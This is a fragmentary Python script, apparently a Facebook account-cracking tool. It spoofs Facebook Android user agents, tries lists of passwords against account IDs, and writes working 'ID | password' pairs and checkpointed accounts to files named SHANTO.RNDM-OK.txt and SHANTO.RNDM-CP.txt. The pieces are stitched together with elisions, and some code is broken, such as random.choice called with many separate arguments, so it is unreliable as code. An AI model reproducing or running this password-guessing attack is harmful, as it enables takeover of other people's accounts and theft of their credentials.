...
def riazfilee():
    END = '[FBAN/FB4A;FBAV/326.0.0.13.97;FBBV/2685664;[FBAN/FB4A;FBAV/439.0.0.44.117;FBBV/446812233;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Telstra Mobile;FBMF/Infinix X5515F;FBBD/Infinix X5515F;FBPN/com.facebook.katana;FBDV/Infinix X5515F;FBSV/4.4.2;FBCA/armeabi-v7a:armeabi;]'
    ua = random.choice("Dalvik/2.0.0 (Linux; U; Android 9; Samsung Galaxy S10)","Dalvik/1.6.0 (Linux; U; Android 8.1; OnePlus 6)","Dalvik/1.5.0 (Linux; U; Android 7.0; LG G6)","Dalvik/1.4.0 (Linux; U; Android 6.0; HTC 10)","Dalvik/1.3.0 (Linux; U; Android 5.1; Sony Xperia Z3)","Dalvik/1.2.0 (Linux; U; Android 5.0; Nexus 5)","Dalvik/1.1.0 (Linux; U; Android 4.4; Motorola Moto G)","Dalvik/1.0.0 (Linux; U; Android 4.3; Samsung Galaxy S4)","Dalvik/0.9.0 (Linux; U; Android 4.2; HTC One X)","Dalvik/0.8.0 (Linux; U; Android 4.1; Samsung Galaxy S3)","Dalvik/0.7.0 (Linux; U; Android 4.0; LG Optimus 2X)","Dalvik/0.6.0 (Linux; U; Android 3.2; Asus Transformer Prime)","Dalvik/0.5.0 (Linux; U; Android 3.1; Motorola Xoom)","Dalvik/0.4.0 (Linux; U; Android 3.0; Acer Iconia Tab)","Dalvik/0.3.0 (Linux; U; Android 2.3; Sony Ericsson Xperia X10)","Dalvik/0.2.0 (Linux; U; Android 2.2; HTC Desire HD)","Dalvik/0.1.0 (Linux; U; Android 2.1; Google Nexus One)","Dalvik/0.0.9 (Linux; U; Android 2.0; Samsung Galaxy Spica)","Dalvik/0.0.8 (Linux; U; Android 1.6; Motorola CLIQ)","Dalvik/0.0.7 (Linux; U; Android 1.5; T-Mobile G1)","Dalvik/0.0.6 (Linux; U; Android 1.1; HTC Magic)","Dalvik/0.0.5 (Linux; U; Android 1.0; HTC Dream)","Dalvik/0.0.4 (Linux; U; Android 1.0; T-Mobile G1)","Dalvik/0.0.3 (Linux; U; Android 1.0; HTC Hero)","Dalvik/0.0.2 (Linux; U; Android 1.0; Samsung Galaxy)","Dalvik/0.0.1 (Linux; U; Android 1.0; Sony Xperia)","Dalvik/1.7.0 (Linux; U; Android 11; Google Pixel 5)","Dalvik/1.8.0 (Linux; U; Android 12; Samsung Galaxy S21)","Dalvik/2.2.0 (Linux; U; Android 13; OnePlus 9)","Dalvik/2.3.0 (Linux; U; Android 14; Xiaomi Mi 11)","Dalvik/2.4.0 (Linux; U; Android 15; Sony Xperia 1)","Dalvik/2.5.0 (Linux; U; Android 16; LG G7)","Dalvik/2.6.0 (Linux; U; Android 17; Motorola Edge)","Dalvik/2.7.0 (Linux; U; Android 18; Huawei P40)","Dalvik/2.8.0 (Linux; U; Android 19; Oppo Find X)","Dalvik/2.9.0 (Linux; U; Android 20; OnePlus Nord)","Dalvik/3.0.0 (Linux; U; Android 21; Google Pixel 6)","Dalvik/3.1.0 (Linux; U; Android 22; Samsung Galaxy Z Fold)","Dalvik/3.2.0 (Linux; U; Android 23; Xiaomi Mi 12)","Dalvik/3.3.0 (Linux; U; Android 24; Sony Xperia 2)","Dalvik/3.4.0 (Linux; U; Android 25; LG V70)","Dalvik/3.5.0 (Linux; U; Android 26; Motorola Razr)","Dalvik/3.6.0 (Linux; U; Android 27; Huawei Mate 40)","Dalvik/3.7.0 (Linux; U; Android 28; Oppo Reno)","Dalvik/3.8.0 (Linux; U; Android 29; OnePlus 10)","Dalvik/3.9.0 (Linux; U; Android 30; Google Pixel 7)","Dalvik/4.0.0 (Linux; U; Android 31; Samsung Galaxy S22)","Dalvik/4.1.0 (Linux; U; Android 32; Xiaomi Mi 13)","Dalvik/4.2.0 (Linux; U; Android 33; Sony Xperia 3)" ) +END
    return ua
...
#<-----[Method~1]---->            
    def method1(self, rid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\x1b[1;97m [RJ M,1] {loop}|{len(self.id)} \x1b[1;92mOK: {len(oks)} {''.format(loop/float(len(self.id)))}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m [SHANTO-OK] '+cid+' | '+ps+'\033[1;32m')
				open('SHANTO.RNDM-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				##print('\33[1;31m [SHANTO-CP] '+cid+' | '+ps+'\33[0;97m')
				open('SHANTO.RNDM-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue 
